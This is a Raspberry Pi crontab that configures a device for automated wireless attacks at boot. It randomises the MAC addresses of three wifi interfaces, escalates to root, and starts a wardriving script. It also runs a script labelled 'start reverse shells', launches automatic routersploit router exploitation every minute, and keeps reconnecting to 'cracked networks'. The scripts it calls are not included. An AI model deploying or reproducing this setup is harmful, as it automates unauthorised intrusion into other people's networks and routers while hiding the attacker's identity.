# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command

# declare path, including default /home/pi
PATH=/home/pi:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/sbin

# change mac address on reboot
@reboot ifconfig wlan0 down;macchanger -r -b wlan0;ifconfig wlan0 up
@reboot ifconfig wlan1 down;macchanger -r -b wlan1;ifconfig wlan1 up
@reboot ifconfig wlan2 down;macchanger -r -b wlan2;ifconfig wlan2 up
@reboot ifconfig wlan0 up
@reboot ifconfig wlan1 up
@reboot ifconfig wlan2 up
@reboot ifconfig eth0 up

# escalate to root on reboot
@reboot /bin/bash /usr/local/bin/startup.sh
@reboot sudo su
@reboot service ssh restart

# start wardriver express on wlan1
@reboot python /home/pi/homepidir/rpi_custom_main.py >> /tmp/wardriving.log

# start reverse shells
@reboot /bin/sh /usr/local/bin/self_infect.sh

# start auto routersploit on wlan2
* * * * * sleep 5;/bin/sh /usr/local/bin/start_autorsf.sh

# every minute rescan and retry looking for cracked networks
* * * * * wpa_supplicant -i wlan2 -c /etc/wpa_supplicant/wpa_supplicant.conf
@reboot sleep 30;wpa_supplicant -i wlan2 -c /etc/wpa_supplicant/wpa_supplicant.conf
